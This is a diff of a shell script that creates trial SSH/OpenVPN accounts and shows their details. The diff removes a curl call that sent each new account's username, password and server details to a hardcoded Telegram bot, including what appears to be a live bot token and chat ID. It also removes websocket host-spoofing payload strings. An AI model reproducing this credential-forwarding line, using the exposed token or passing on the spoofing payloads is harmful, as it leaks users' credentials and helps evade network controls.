@@ -43,48 +43,35 @@ exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
 hariini=`date -d "0 days" +"%Y-%m-%d"`
 expi=`date -d "$masaaktif days" +"%Y-%m-%d"`
 echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
-echo -e ""
-TEXT="
-Thank You For Using Our Service
-Informasi SSH OpenVPN
-==============================
-Username : $Login
-Password : $Pass
-Created On : $hariini
-Expired On : $expi
-==============================
-✓Detail Port SSH OpenVPN✓
-==============================
-Domain SSH : ${domain}
-IP Host : $IP
-Ssh Websocket TLS : $ws
-Ssh Websocket NTLS : $ws2
-Dropbear : 109, 143
-SSL TLS :$ssl
-Port Squid :$sqd
-OHP SSH : 8181
-OHP Dropbear : 8282
-OHP OpenVPN : 8383
-OpenVPN Websocket : 2086
-OpenVPN SSL : 990
-BadVpn UDPGW : 7100-7200-7300
-==============================
-✓Link Config OpenVPN✓
-==============================
-TCP : http://${domain}:89/tcp.ovpn
-UDP : http://${domain}:89/udp.ovpn
-SSL : http://${domain}:89/ssl.ovpn
-==============================
-• Payload Websocket TLS :
-GET wss://who.int/ HTTP/1.1 [crlf]Host: ${domain}[crlf]Upgrade: websocekt[crlf][crlf]
-• Payload Websocket NTLS :
-GET / HTTP/1.1 [crlf]Host: ${domain}[crlf]Upgrade: websocekt[crlf][crlf]
-==============================
-"
-curl -s --max-time 10 -d "chat_id=1668998643&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" https://api.telegram.org/bot5972770394:AAFz8aRmieB4Q3U_r3EuCg-NhjJSdiqsppA/sendMessage >/dev/null
 clear
-echo -e "[ ${GREEN}OKEY${NC} ] • Ssh Trial Success Created"
-echo -e "[ ${RED}NOTE${NC} ] • Please Check Bot Telegram"
+echo -e ""
+echo -e "•──────────────────•"
+echo -e " 🔰TRIAL SSH & OVPN🔰"
+echo -e "•──────────────────•"
+echo -e "Username : $Login"
+echo -e "Password : $Pass"
+echo -e "Created On : $hariini"
+echo -e "Expired On : $expi"
+echo -e "•──────────────────•"
+echo -e "» Port Information :"
+echo -e "» IP/Host : $IP"
+echo -e "» Domain : ${domain}"
+echo -e "» Websocket : $ws, $ws2"
+echo -e "» Dropbear : 143, 109"
+echo -e "» SSL/TLS :$ssl"
+echo -e "» Squid :$sqd"
+echo -e "» OpenVPN WS : 2086"
+echo -e "» Ohp SSH : 8181"
+echo -e "» Ohp Dropbear : 8282"
+echo -e "» Ohp OpenVPN : 8383"
+echo -e "» OpenVPN SSL : 990"
+echo -e "» UDPGW : 7100 - 7300"
+echo -e "•──────────────────•"
+echo -e " ✅Link Config OpenVPN✅"
+echo -e "TCP: http://${domain}:89/tcp.ovpn"
+echo -e "UDP: http://${domain}:89/udp.ovpn"
+echo -e "SSL: http://${domain}:89/ssl.ovpn"
+echo -e "•──────────────────•"
 echo -e ""
 read -n 1 -s -r -p "Press any key to back on menu"
 
